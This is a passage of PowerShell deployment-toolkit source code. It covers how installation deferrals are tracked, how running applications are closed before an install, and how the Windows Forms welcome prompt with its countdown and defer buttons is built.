				}
				Else {
					[string]$ProcessInfo = $process
					$processObjects += New-Object -TypeName 'PSObject' -Property @{
						ProcessName = $process
						ProcessDescription = ''
					}
				}
			}
		}

		
		If (($allowDefer) -or ($AllowDeferCloseApps)) {
			
			$allowDefer = $true

			
			$deferHistory = Get-DeferHistory
			$deferHistoryTimes = $deferHistory | Select-Object -ExpandProperty 'DeferTimesRemaining' -ErrorAction 'SilentlyContinue'
			$deferHistoryDeadline = $deferHistory | Select-Object -ExpandProperty 'DeferDeadline' -ErrorAction 'SilentlyContinue'

			
			$checkDeferDays = $false
			$checkDeferDeadline = $false
			If ($DeferDays -ne 0) { $checkDeferDays = $true }
			If ($DeferDeadline) { $checkDeferDeadline = $true }
			If ($DeferTimes -ne 0) {
				If ($deferHistoryTimes -ge 0) {
					Write-Log -Message "Defer history shows [$($deferHistory.DeferTimesRemaining)] deferrals remaining." -Source ${CmdletName}
					$DeferTimes = $deferHistory.DeferTimesRemaining - 1
				}
				Else {
					$DeferTimes = $DeferTimes - 1
				}
				Write-Log -Message "User has [$deferTimes] deferrals remaining." -Source ${CmdletName}
				If ($DeferTimes -lt 0) {
					Write-Log -Message 'Deferral has expired.' -Source ${CmdletName}
					$AllowDefer = $false
				}
			}
			Else {
				If (Test-Path -LiteralPath 'variable:deferTimes') { Remove-Variable -Name 'deferTimes' }
				$DeferTimes = $null
			}
			If ($checkDeferDays -and $allowDefer) {
				If ($deferHistoryDeadline) {
					Write-Log -Message "Defer history shows a deadline date of [$deferHistoryDeadline]." -Source ${CmdletName}
					[string]$deferDeadlineUniversal = Get-UniversalDate -DateTime $deferHistoryDeadline
				}
				Else {
					[string]$deferDeadlineUniversal = Get-UniversalDate -DateTime (Get-Date -Date ((Get-Date).AddDays($deferDays)) -Format ($culture).DateTimeFormat.UniversalDateTimePattern).ToString()
				}
				Write-Log -Message "User has until [$deferDeadlineUniversal] before deferral expires." -Source ${CmdletName}
				If ((Get-UniversalDate) -gt $deferDeadlineUniversal) {
					Write-Log -Message 'Deferral has expired.' -Source ${CmdletName}
					$AllowDefer = $false
				}
			}
			If ($checkDeferDeadline -and $allowDefer) {
				
				Try {
					[string]$deferDeadlineUniversal = Get-UniversalDate -DateTime $deferDeadline -ErrorAction 'Stop'
				}
				Catch {
					Write-Log -Message "Date is not in the correct format for the current culture. Type the date in the current locale format, such as 20/08/2014 (Europe) or 08/20/2014 (United States). If the script is intended for multiple cultures, specify the date in the universal sortable date/time format, e.g. '2013-08-22 11:51:52Z'. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
					Throw "Date is not in the correct format for the current culture. Type the date in the current locale format, such as 20/08/2014 (Europe) or 08/20/2014 (United States). If the script is intended for multiple cultures, specify the date in the universal sortable date/time format, e.g. '2013-08-22 11:51:52Z': $($_.Exception.Message)"
				}
				Write-Log -Message "User has until [$deferDeadlineUniversal] remaining." -Source ${CmdletName}
				If ((Get-UniversalDate) -gt $deferDeadlineUniversal) {
					Write-Log -Message 'Deferral has expired.' -Source ${CmdletName}
					$AllowDefer = $false
				}
			}
		}
		If (($deferTimes -lt 0) -and (-not ($deferDeadlineUniversal))) { $AllowDefer = $false }

		
		If (-not ($deployModeSilent) -and (-not ($silent))) {
			If ($forceCloseAppsCountdown -gt 0) {
				
				$closeAppsCountdown = $forceCloseAppsCountdown
				
				[boolean]$forceCloseAppsCountdown = $true
			}
			ElseIf ($forceCountdown -gt 0){
				
				$closeAppsCountdown = $forceCountdown
				
				[boolean]$forceCountdown = $true
			}
			Set-Variable -Name 'closeAppsCountdownGlobal' -Value $closeAppsCountdown -Scope 'Script'

			While ((Get-RunningProcesses -ProcessObjects $processObjects -OutVariable 'runningProcesses') -or (($promptResult -ne 'Defer') -and ($promptResult -ne 'Close'))) {
				[string]$runningProcessDescriptions = ($runningProcesses | Where-Object { $_.ProcessDescription } | Select-Object -ExpandProperty 'ProcessDescription' | Select-Object -Unique | Sort-Object) -join ','
				
				If ($allowDefer) {
					
					If ($AllowDeferCloseApps -and (-not $runningProcessDescriptions)) {
						Break
					}
					
					ElseIf (($promptResult -ne 'Close') -or (($runningProcessDescriptions) -and ($promptResult -ne 'Continue'))) {
						[string]$promptResult = Show-WelcomePrompt -ProcessDescriptions $runningProcessDescriptions -CloseAppsCountdown $closeAppsCountdownGlobal -ForceCloseAppsCountdown $forceCloseAppsCountdown -ForceCountdown $forceCountdown -PersistPrompt $PersistPrompt -AllowDefer -DeferTimes $deferTimes -DeferDeadline $deferDeadlineUniversal -MinimizeWindows $MinimizeWindows -CustomText:$CustomText -TopMost $TopMost
					}
				}
				
				ElseIf (($runningProcessDescriptions) -or ($forceCountdown)) {
					[string]$promptResult = Show-WelcomePrompt -ProcessDescriptions $runningProcessDescriptions -CloseAppsCountdown $closeAppsCountdownGlobal -ForceCloseAppsCountdown $forceCloseAppsCountdown -ForceCountdown $forceCountdown -PersistPrompt $PersistPrompt -MinimizeWindows $minimizeWindows -CustomText:$CustomText -TopMost $TopMost
				}
				
				Else {
					Break
				}

				
				If ($promptResult -eq 'Continue') {
					Write-Log -Message 'User selected to continue...' -Source ${CmdletName}
					Start-Sleep -Seconds 2

					
					If (-not $runningProcesses) { Break }
				}
				
				ElseIf ($promptResult -eq 'Close') {
					Write-Log -Message 'User selected to force the application(s) to close...' -Source ${CmdletName}
					If (($PromptToSave) -and ($SessionZero -and (-not $IsProcessUserInteractive))) {
						Write-Log -Message 'Specified [-PromptToSave] option will not be available because current process is running in session zero and is not interactive.' -Severity 2 -Source ${CmdletName}
					}

					ForEach ($runningProcess in $runningProcesses) {
						[psobject[]]$AllOpenWindowsForRunningProcess = Get-WindowTitle -GetAllWindowTitles -DisableFunctionLogging | Where-Object { $_.ParentProcess -eq $runningProcess.Name }
						
						If (($PromptToSave) -and (-not ($SessionZero -and (-not $IsProcessUserInteractive))) -and ($AllOpenWindowsForRunningProcess) -and ($runningProcess.MainWindowHandle -ne [IntPtr]::Zero)) {
							[timespan]$PromptToSaveTimeout = New-TimeSpan -Seconds $configInstallationPromptToSave
							[Diagnostics.StopWatch]$PromptToSaveStopWatch = [Diagnostics.StopWatch]::StartNew()
							$PromptToSaveStopWatch.Reset()
							ForEach ($OpenWindow in $AllOpenWindowsForRunningProcess) {
								Try {
									Write-Log -Message "Stop process [$($runningProcess.Name)] with window title [$($OpenWindow.WindowTitle)] and prompt to save if there is work to be saved (timeout in [$configInstallationPromptToSave] seconds)..." -Source ${CmdletName}
									[boolean]$IsBringWindowToFrontSuccess = [PSADT.UiAutomation]::BringWindowToFront($OpenWindow.WindowHandle)
									[boolean]$IsCloseWindowCallSuccess = $runningProcess.CloseMainWindow()
									If (-not $IsCloseWindowCallSuccess) {
										Write-Log -Message "Failed to call the CloseMainWindow() method on process [$($runningProcess.Name)] with window title [$($OpenWindow.WindowTitle)] because the main window may be disabled due to a modal dialog being shown." -Severity 3 -Source ${CmdletName}
									}
									Else {
										$PromptToSaveStopWatch.Start()
										Do {
											[boolean]$IsWindowOpen = [boolean](Get-WindowTitle -GetAllWindowTitles -DisableFunctionLogging | Where-Object { $_.WindowHandle -eq $OpenWindow.WindowHandle })
											If (-not $IsWindowOpen) { Break }
											Start-Sleep -Seconds 3
										} While (($IsWindowOpen) -and ($PromptToSaveStopWatch.Elapsed -lt $PromptToSaveTimeout))
										$PromptToSaveStopWatch.Reset()
										If ($IsWindowOpen) {
											Write-Log -Message "Exceeded the [$configInstallationPromptToSave] seconds timeout value for the user to save work associated with process [$($runningProcess.Name)] with window title [$($OpenWindow.WindowTitle)]." -Severity 2 -Source ${CmdletName}
										}
										Else {
											Write-Log -Message "Window [$($OpenWindow.WindowTitle)] for process [$($runningProcess.Name)] was successfully closed." -Source ${CmdletName}
										}
									}
								}
								Catch {
									Write-Log -Message "Failed to close window [$($OpenWindow.WindowTitle)] for process [$($runningProcess.Name)]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
									Continue
								}
								Finally {
									$runningProcess.Refresh()
								}
							}
						}
						Else {
							Write-Log -Message "Stop process $($runningProcess.Name)..." -Source ${CmdletName}
							Stop-Process -Id $runningProcess.Id -Force -ErrorAction 'SilentlyContinue'
						}
					}
					Start-Sleep -Seconds 2
				}
				
				ElseIf ($promptResult -eq 'Timeout') {
					Write-Log -Message 'Installation not actioned before the timeout value.' -Source ${CmdletName}
					$BlockExecution = $false

					If (($deferTimes -ge 0) -or ($deferDeadlineUniversal)) {
						Set-DeferHistory -DeferTimesRemaining $DeferTimes -DeferDeadline $deferDeadlineUniversal
					}
					
					If ($script:welcomeTimer) {
						Try {
							$script:welcomeTimer.Dispose()
							$script:welcomeTimer = $null
						}
						Catch { }
					}

					
					$null = $shellApp.UndoMinimizeAll()

					Exit-Script -ExitCode $configInstallationUIExitCode
				}
				
				ElseIf ($promptResult -eq 'Defer') {
					Write-Log -Message 'Installation deferred by the user.' -Source ${CmdletName}
					$BlockExecution = $false

					Set-DeferHistory -DeferTimesRemaining $DeferTimes -DeferDeadline $deferDeadlineUniversal

					
					$null = $shellApp.UndoMinimizeAll()

					Exit-Script -ExitCode $configInstallationDeferExitCode
				}
			}
		}

		
		If (($Silent -or $deployModeSilent) -and $CloseApps) {
			[array]$runningProcesses = $null
			[array]$runningProcesses = Get-RunningProcesses $processObjects
			If ($runningProcesses) {
				[string]$runningProcessDescriptions = ($runningProcesses | Where-Object { $_.ProcessDescription } | Select-Object -ExpandProperty 'ProcessDescription' | Select-Object -Unique | Sort-Object) -join ','
				Write-Log -Message "Force close application(s) [$($runningProcessDescriptions)] without prompting user." -Source ${CmdletName}
				$runningProcesses | Stop-Process -Force -ErrorAction 'SilentlyContinue'
				Start-Sleep -Seconds 2
			}
		}

		
		If (($processObjects | Select-Object -ExpandProperty 'ProcessName') -contains 'notes') {
			
			[string]$notesPath = Get-Item -LiteralPath $regKeyLotusNotes -ErrorAction 'SilentlyContinue' | Get-ItemProperty | Select-Object -ExpandProperty 'Path'

			
			If ((-not $IsLocalSystemAccount) -and ($notesPath)) {
				
				[string[]]$notesPathExes = Get-ChildItem -LiteralPath $notesPath -Filter '*.exe' -Recurse | Select-Object -ExpandProperty 'BaseName' | Sort-Object
				
				$notesPathExes | ForEach-Object {
					If ((Get-Process | Select-Object -ExpandProperty 'Name') -contains $_) {
						[string]$notesNSDExecutable = Join-Path -Path $notesPath -ChildPath 'NSD.exe'
						Try {
							If (Test-Path -LiteralPath $notesNSDExecutable -PathType 'Leaf' -ErrorAction 'Stop') {
								Write-Log -Message "Execute [$notesNSDExecutable] with the -kill argument..." -Source ${CmdletName}
								[Diagnostics.Process]$notesNSDProcess = Start-Process -FilePath $notesNSDExecutable -ArgumentList '-kill' -WindowStyle 'Hidden' -PassThru -ErrorAction 'SilentlyContinue'

								If (-not ($notesNSDProcess.WaitForExit(10000))) {
									Write-Log -Message "[$notesNSDExecutable] did not end in a timely manner. Force terminate process." -Source ${CmdletName}
									Stop-Process -Name 'NSD' -Force -ErrorAction 'SilentlyContinue'
								}
							}
						}
						Catch {
							Write-Log -Message "Failed to launch [$notesNSDExecutable]. `n$(Resolve-Error)" -Source ${CmdletName}
						}

						Write-Log -Message "[$notesNSDExecutable] returned exit code [$($notesNSDProcess.ExitCode)]." -Source ${CmdletName}

						
						Stop-Process -Name 'NSD' -Force -ErrorAction 'SilentlyContinue'
					}
				}
			}

			
			If ($notesPathExes) {
				[array]$processesIgnoringNotesExceptions = Compare-Object -ReferenceObject ($processObjects | Select-Object -ExpandProperty 'ProcessName' | Sort-Object) -DifferenceObject $notesPathExes -IncludeEqual | Where-Object { ($_.SideIndicator -eq '<=') -or ($_.InputObject -eq 'notes') } | Select-Object -ExpandProperty 'InputObject'
				[array]$processObjects = $processObjects | Where-Object { $processesIgnoringNotesExceptions -contains $_.ProcessName }
			}
		}

		
		If ($BlockExecution) {
			
			Set-Variable -Name 'BlockExecution' -Value $BlockExecution -Scope 'Script'
			Write-Log -Message '[-BlockExecution] parameter specified.' -Source ${CmdletName}
			Block-AppExecution -ProcessName ($processObjects | Select-Object -ExpandProperty 'ProcessName')
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Show-WelcomePrompt {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[string]$ProcessDescriptions,
		[Parameter(Mandatory=$false)]
		[int32]$CloseAppsCountdown,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ForceCloseAppsCountdown,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$PersistPrompt = $false,
		[Parameter(Mandatory=$false)]
		[switch]$AllowDefer = $false,
		[Parameter(Mandatory=$false)]
		[string]$DeferTimes,
		[Parameter(Mandatory=$false)]
		[string]$DeferDeadline,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$MinimizeWindows = $true,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$TopMost = $true,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$ForceCountdown = 0,
		[Parameter(Mandatory=$false)]
		[switch]$CustomText = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		[boolean]$showCloseApps = $false
		[boolean]$showDefer = $false
		[boolean]$persistWindow = $false

		
		[datetime]$startTime = Get-Date
		[datetime]$countdownTime = $startTime

		
		If ($CloseAppsCountdown) {
			If ($CloseAppsCountdown -gt $configInstallationUITimeout) {
				Throw 'The close applications countdown time cannot be longer than the timeout specified in the XML configuration for installation UI dialogs to timeout.'
			}
		}

		
		If ($processDescriptions) {
			Write-Log -Message "Prompt user to close application(s) [$processDescriptions]..." -Source ${CmdletName}
			$showCloseApps = $true
		}
		If (($allowDefer) -and (($deferTimes -ge 0) -or ($deferDeadline))) {
			Write-Log -Message 'User has the option to defer.' -Source ${CmdletName}
			$showDefer = $true
			If ($deferDeadline) {
				
				$deferDeadline = $deferDeadline -replace 'Z',''
				
				[string]$deferDeadline = (Get-Date -Date $deferDeadline).ToString()
			}
		}

		
		If (-not $showDefer) {
			If ($closeAppsCountdown -gt 0) {
				Write-Log -Message "Close applications countdown has [$closeAppsCountdown] seconds remaining." -Source ${CmdletName}
				$showCountdown = $true
			}
		}
		If ($showDefer) {
			If ($persistPrompt) { $persistWindow = $true }
		}
		
		If ($forceCloseAppsCountdown -eq $true) {
			Write-Log -Message "Close applications countdown has [$closeAppsCountdown] seconds remaining." -Source ${CmdletName}
			$showCountdown = $true
		}
		
		If ($forceCountdown -eq $true) {
			Write-Log -Message "Countdown has [$closeAppsCountdown] seconds remaining." -Source ${CmdletName}
			$showCountdown = $true
		}

		[string[]]$processDescriptions = $processDescriptions -split ','
		[Windows.Forms.Application]::EnableVisualStyles()

		$formWelcome = New-Object -TypeName 'System.Windows.Forms.Form'
		$pictureBanner = New-Object -TypeName 'System.Windows.Forms.PictureBox'
		$labelAppName = New-Object -TypeName 'System.Windows.Forms.Label'
		$labelCountdown = New-Object -TypeName 'System.Windows.Forms.Label'
		$labelDefer = New-Object -TypeName 'System.Windows.Forms.Label'
		$listBoxCloseApps = New-Object -TypeName 'System.Windows.Forms.ListBox'
		$buttonContinue = New-Object -TypeName 'System.Windows.Forms.Button'
		$buttonDefer = New-Object -TypeName 'System.Windows.Forms.Button'
		$buttonCloseApps = New-Object -TypeName 'System.Windows.Forms.Button'
		$buttonAbort = New-Object -TypeName 'System.Windows.Forms.Button'
		$formWelcomeWindowState = New-Object -TypeName 'System.Windows.Forms.FormWindowState'
		$flowLayoutPanel = New-Object -TypeName 'System.Windows.Forms.FlowLayoutPanel'
		$panelButtons = New-Object -TypeName 'System.Windows.Forms.Panel'
		$toolTip = New-Object -TypeName 'System.Windows.Forms.ToolTip'

		
		[scriptblock]$Form_Cleanup_FormClosed = {
			Try {
				$labelAppName.remove_Click($handler_labelAppName_Click)
				$labelDefer.remove_Click($handler_labelDefer_Click)
				$buttonCloseApps.remove_Click($buttonCloseApps_OnClick)
				$buttonContinue.remove_Click($buttonContinue_OnClick)
				$buttonDefer.remove_Click($buttonDefer_OnClick)
				$buttonAbort.remove_Click($buttonAbort_OnClick)
				$script:welcomeTimer.remove_Tick($timer_Tick)
				$timerPersist.remove_Tick($timerPersist_Tick)
				$timerRunningProcesses.remove_Tick($timerRunningProcesses_Tick)
				$formWelcome.remove_Load($Form_StateCorrection_Load)
				$formWelcome.remove_FormClosed($Form_Cleanup_FormClosed)
			}
			Catch { }
		}

		[scriptblock]$Form_StateCorrection_Load = {
			
			$formWelcome.WindowState = 'Normal'
			$formWelcome.AutoSize = $true
			$formWelcome.TopMost = $TopMost
			$formWelcome.BringToFront()
			
			Set-Variable -Name 'formWelcomeStartPosition' -Value $formWelcome.Location -Scope 'Script'

			
			[datetime]$currentTime = Get-Date
			[datetime]$countdownTime = $startTime.AddSeconds($CloseAppsCountdown)
			$script:welcomeTimer.Start()

			
			[timespan]$remainingTime = $countdownTime.Subtract($currentTime)
			[string]$labelCountdownSeconds = [string]::Format('{0}:{1:d2}:{2:d2}', $remainingTime.Days * 24 + $remainingTime.Hours, $remainingTime.Minutes, $remainingTime.Seconds)
			If ($forceCountdown -eq $true) {
				If ($deploymentType -ieq 'Install') { $labelCountdown.Text = ($configWelcomePromptCountdownMessage -f $($configDeploymentTypeInstall.ToLower())) + "`n$labelCountdownSeconds" }
				Else { $labelCountdown.Text = ($configWelcomePromptCountdownMessage -f $($configDeploymentTypeUninstall.ToLower())) + "`n$labelCountdownSeconds" }
			}
			Else { $labelCountdown.Text = "$configClosePromptCountdownMessage`n$labelCountdownSeconds" }
		}

		
		If (-not ($script:welcomeTimer)) {
			$script:welcomeTimer = New-Object -TypeName 'System.Windows.Forms.Timer'
		}

		If ($showCountdown) {
			[scriptblock]$timer_Tick = {
				
				[datetime]$currentTime = Get-Date
				[datetime]$countdownTime = $startTime.AddSeconds($CloseAppsCountdown)
				[timespan]$remainingTime = $countdownTime.Subtract($currentTime)
				Set-Variable -Name 'closeAppsCountdownGlobal' -Value $remainingTime.TotalSeconds -Scope 'Script'

				
				If ($countdownTime -lt $currentTime) {
					If ($forceCountdown -eq $true) {
						Write-Log -Message 'Countdown timer has elapsed. Force continue.' -Source ${CmdletName}
						$buttonContinue.PerformClick()
					}
					Else {
						Write-Log -Message 'Close application(s) countdown timer has elapsed. Force closing application(s).' -Source ${CmdletName}
						If ($buttonCloseApps.CanFocus) { $buttonCloseApps.PerformClick() }
						Else { $buttonContinue.PerformClick() }
					}
				}
				Else {
					
					[string]$labelCountdownSeconds = [string]::Format('{0}:{1:d2}:{2:d2}', $remainingTime.Days * 24 + $remainingTime.Hours, $remainingTime.Minutes, $remainingTime.Seconds)
					If ($forceCountdown -eq $true) {
						If ($deploymentType -ieq 'Install') { $labelCountdown.Text = ($configWelcomePromptCountdownMessage -f $configDeploymentTypeInstall) + "`n$labelCountdownSeconds" }
						Else { $labelCountdown.Text = ($configWelcomePromptCountdownMessage -f $configDeploymentTypeUninstall) + "`n$labelCountdownSeconds" }
					}
					Else { $labelCountdown.Text = "$configClosePromptCountdownMessage`n$labelCountdownSeconds" }
					[Windows.Forms.Application]::DoEvents()
				}
			}
		}
		Else {
			$script:welcomeTimer.Interval = ($configInstallationUITimeout * 1000)
			[scriptblock]$timer_Tick = { $buttonAbort.PerformClick() }
		}

		$script:welcomeTimer.add_Tick($timer_Tick)

		
		If ($persistWindow) {
			$timerPersist = New-Object -TypeName 'System.Windows.Forms.Timer'
			$timerPersist.Interval = ($configInstallationPersistInterval * 1000)
			[scriptblock]$timerPersist_Tick = { Update-InstallationWelcome }
			$timerPersist.add_Tick($timerPersist_Tick)
			$timerPersist.Start()
		}

		
		If ($configInstallationWelcomePromptDynamicRunningProcessEvaluation) {
				$timerRunningProcesses = New-Object -TypeName 'System.Windows.Forms.Timer'
				$timerRunningProcesses.Interval = ($configInstallationWelcomePromptDynamicRunningProcessEvaluationInterval * 1000)
				[scriptblock]$timerRunningProcesses_Tick = { try { Get-RunningProcessesDynamically } catch {} }
				$timerRunningProcesses.add_Tick($timerRunningProcesses_Tick)
				$timerRunningProcesses.Start()
		}

		
		$formWelcome.Controls.Add($pictureBanner)
		$formWelcome.Controls.Add($buttonAbort)

		
		
		$paddingNone = New-Object -TypeName 'System.Windows.Forms.Padding'
		$paddingNone.Top = 0
		$paddingNone.Bottom = 0
		$paddingNone.Left = 0
		$paddingNone.Right = 0

		
		$buttonWidth = 110
		$buttonHeight = 23
		$buttonPadding = 50
		$buttonSize = New-Object -TypeName 'System.Drawing.Size'
		$buttonSize.Width = $buttonWidth
		$buttonSize.Height = $buttonHeight
		$buttonPadding = New-Object -TypeName 'System.Windows.Forms.Padding'
		$buttonPadding.Top = 0
		$buttonPadding.Bottom = 5
		$buttonPadding.Left = 50
		$buttonPadding.Right = 0

		
		$pictureBanner.DataBindings.DefaultDataSourceUpdateMode = 0
		$pictureBanner.ImageLocation = $appDeployLogoBanner
		$System_Drawing_Point = New-Object -TypeName 'System.Drawing.Point'
		$System_Drawing_Point.X = 0
		$System_Drawing_Point.Y = 0
		$pictureBanner.Location = $System_Drawing_Point
		$pictureBanner.Name = 'pictureBanner'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = $appDeployLogoBannerHeight
		$System_Drawing_Size.Width = 450
		$pictureBanner.Size = $System_Drawing_Size
		$pictureBanner.SizeMode = 'CenterImage'
		$pictureBanner.Margin = $paddingNone
		$pictureBanner.TabIndex = 0
		$pictureBanner.TabStop = $false

		
		$labelAppName.DataBindings.DefaultDataSourceUpdateMode = 0
		$labelAppName.Name = 'labelAppName'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		If (-not $showCloseApps) {
			$System_Drawing_Size.Height = 40
		}
		Else {
			$System_Drawing_Size.Height = 65
		}
		$System_Drawing_Size.Width = 450
		$labelAppName.Size = $System_Drawing_Size
		$System_Drawing_Size.Height = 0
		$labelAppName.MaximumSize = $System_Drawing_Size
		$labelAppName.Margin = '0,15,0,15'
		$labelAppName.Padding = '20,0,20,0'
		$labelAppName.TabIndex = 1

		
		If ($showCloseApps) {
			$labelAppNameText = $configClosePromptMessage
		}
		ElseIf (($showDefer) -or ($forceCountdown)) {
			$labelAppNameText = "$configDeferPromptWelcomeMessage `n$installTitle"
		}
		If ($CustomText) {
			$labelAppNameText = "$labelAppNameText `n`n$configWelcomePromptCustomMessage"
		}
		$labelAppName.Text = $labelAppNameText
		$labelAppName.TextAlign = 'TopCenter'
		$labelAppName.Anchor = 'Top'
		$labelAppName.AutoSize = $true
		$labelAppName.add_Click($handler_labelAppName_Click)

		
		$listBoxCloseApps.DataBindings.DefaultDataSourceUpdateMode = 0
		$listBoxCloseApps.FormattingEnabled = $true
		$listBoxCloseApps.HorizontalScrollbar = $true
		$listBoxCloseApps.Name = 'listBoxCloseApps'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 100
		$System_Drawing_Size.Width = 300
		$listBoxCloseApps.Size = $System_Drawing_Size
		$listBoxCloseApps.Margin = '75,0,0,0'
		$listBoxCloseApps.TabIndex = 3
		$ProcessDescriptions | ForEach-Object { $null = $listboxCloseApps.Items.Add($_) }

		
		$labelDefer.DataBindings.DefaultDataSourceUpdateMode = 0
		$labelDefer.Name = 'labelDefer'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 90
		$System_Drawing_Size.Width = 450
		$labelDefer.Size = $System_Drawing_Size
		$System_Drawing_Size.Height = 0
		$labelDefer.MaximumSize = $System_Drawing_Size
		$labelDefer.Margin = $paddingNone
		$labelDefer.Padding = '40,0,20,0'
		$labelDefer.TabIndex = 4
		$deferralText = "$configDeferPromptExpiryMessage`n"

		If ($deferTimes -ge 0) {
			$deferralText = "$deferralText `n$configDeferPromptRemainingDeferrals $([int32]$deferTimes + 1)"
		}
		If ($deferDeadline) {
			$deferralText = "$deferralText `n$configDeferPromptDeadline $deferDeadline"
		}
		If (($deferTimes -lt 0) -and (-not $DeferDeadline)) {
			$deferralText = "$deferralText `n$configDeferPromptNoDeadline"
		}
		$deferralText = "$deferralText `n`n$configDeferPromptWarningMessage"
		$labelDefer.Text = $deferralText
		$labelDefer.TextAlign = 'MiddleCenter'
		$labelDefer.AutoSize = $true
		$labelDefer.add_Click($handler_labelDefer_Click)

		
		$labelCountdown.DataBindings.DefaultDataSourceUpdateMode = 0
		$labelCountdown.Name = 'labelCountdown'
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 40
		$System_Drawing_Size.Width = 450
		$labelCountdown.Size = $System_Drawing_Size
		$System_Drawing_Size.Height = 0
		$labelCountdown.MaximumSize = $System_Drawing_Size
		$labelCountdown.Margin = $paddingNone
		$labelCountdown.Padding = '40,0,20,0'
		$labelCountdown.TabIndex = 4
		$labelCountdown.Font = 'Microsoft Sans Serif, 9pt, style=Bold'
		$labelCountdown.Text = '00:00:00'
		$labelCountdown.TextAlign = 'MiddleCenter'
		$labelCountdown.AutoSize = $true
		$labelCountdown.add_Click($handler_labelDefer_Click)

		
		$System_Drawing_Point = New-Object -TypeName 'System.Drawing.Point'
		$System_Drawing_Point.X = 0
		$System_Drawing_Point.Y = $appDeployLogoBannerHeight
		$flowLayoutPanel.Location = $System_Drawing_Point
		$flowLayoutPanel.AutoSize = $true
		$flowLayoutPanel.Anchor = 'Top'
		$flowLayoutPanel.FlowDirection = 'TopDown'
		$flowLayoutPanel.WrapContents = $true
		$flowLayoutPanel.Controls.Add($labelAppName)
		If ($showCloseApps) { $flowLayoutPanel.Controls.Add($listBoxCloseApps) }
		If ($showDefer) {
			$flowLayoutPanel.Controls.Add($labelDefer)
		}
		If ($showCountdown) {
			$flowLayoutPanel.Controls.Add($labelCountdown)
		}

		
		$buttonCloseApps.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonCloseApps.Location = '15,0'
		$buttonCloseApps.Name = 'buttonCloseApps'
		$buttonCloseApps.Size = $buttonSize
		$buttonCloseApps.TabIndex = 5
		$buttonCloseApps.Text = $configClosePromptButtonClose
		$buttonCloseApps.DialogResult = 'Yes'
		$buttonCloseApps.AutoSize = $true
		$buttonCloseApps.UseVisualStyleBackColor = $true
		$buttonCloseApps.add_Click($buttonCloseApps_OnClick)

		
		$buttonDefer.DataBindings.DefaultDataSourceUpdateMode = 0
		If (-not $showCloseApps) {
			$buttonDefer.Location = '15,0'
		}
		Else {
			$buttonDefer.Location = '170,0'
		}
		$buttonDefer.Name = 'buttonDefer'
		$buttonDefer.Size = $buttonSize
		$buttonDefer.TabIndex = 6
		$buttonDefer.Text = $configClosePromptButtonDefer
		$buttonDefer.DialogResult = 'No'
		$buttonDefer.AutoSize = $true
		$buttonDefer.UseVisualStyleBackColor = $true
		$buttonDefer.add_Click($buttonDefer_OnClick)

		
		$buttonContinue.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonContinue.Location = '325,0'
		$buttonContinue.Name = 'buttonContinue'
		$buttonContinue.Size = $buttonSize
		$buttonContinue.TabIndex = 7
		$buttonContinue.Text = $configClosePromptButtonContinue
		$buttonContinue.DialogResult = 'OK'
		$buttonContinue.AutoSize = $true
		$buttonContinue.UseVisualStyleBackColor = $true
		$buttonContinue.add_Click($buttonContinue_OnClick)
		If ($showCloseApps) {
			
			$toolTip.BackColor = [Drawing.Color]::LightGoldenrodYellow
			$toolTip.IsBalloon = $false
			$toolTip.InitialDelay = 100
			$toolTip.ReshowDelay = 100
			$toolTip.SetToolTip($buttonContinue, $configClosePromptButtonContinueTooltip)
		}

		
		$buttonAbort.DataBindings.DefaultDataSourceUpdateMode = 0
		$buttonAbort.Name = 'buttonAbort'
		$buttonAbort.Size = '1,1'
		$buttonAbort.TabStop = $false
		$buttonAbort.DialogResult = 'Abort'
		$buttonAbort.TabIndex = 5
		$buttonAbort.UseVisualStyleBackColor = $true
		$buttonAbort.add_Click($buttonAbort_OnClick)

		
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 0
		$System_Drawing_Size.Width = 0
		$formWelcome.Size = $System_Drawing_Size
		$formWelcome.Padding = $paddingNone
		$formWelcome.Margin = $paddingNone
		$formWelcome.DataBindings.DefaultDataSourceUpdateMode = 0
		$formWelcome.Name = 'WelcomeForm'
		$formWelcome.Text = $installTitle
		$formWelcome.StartPosition = 'CenterScreen'
		$formWelcome.FormBorderStyle = 'FixedDialog'
		$formWelcome.MaximizeBox = $false
		$formWelcome.MinimizeBox = $false
		$formWelcome.TopMost = $TopMost
		$formWelcome.TopLevel = $true
		$formWelcome.Icon = New-Object -TypeName 'System.Drawing.Icon' -ArgumentList $AppDeployLogoIcon
		$formWelcome.AutoSize = $true
		$formWelcome.Controls.Add($pictureBanner)
		$formWelcome.Controls.Add($flowLayoutPanel)

		
		$System_Drawing_Point = New-Object -TypeName 'System.Drawing.Point'
		$System_Drawing_Point.X = 0
		
		$System_Drawing_Point.Y = (($formWelcome.Size | Select-Object -ExpandProperty 'Height') - 10)
		$panelButtons.Location = $System_Drawing_Point
		$System_Drawing_Size = New-Object -TypeName 'System.Drawing.Size'
		$System_Drawing_Size.Height = 40
		$System_Drawing_Size.Width = 450
		$panelButtons.Size = $System_Drawing_Size
		$panelButtons.AutoSize = $true
		$panelButtons.Anchor = 'Top'
		$padding = New-Object -TypeName 'System.Windows.Forms.Padding'
		$padding.Top = 0
		$padding.Bottom = 0
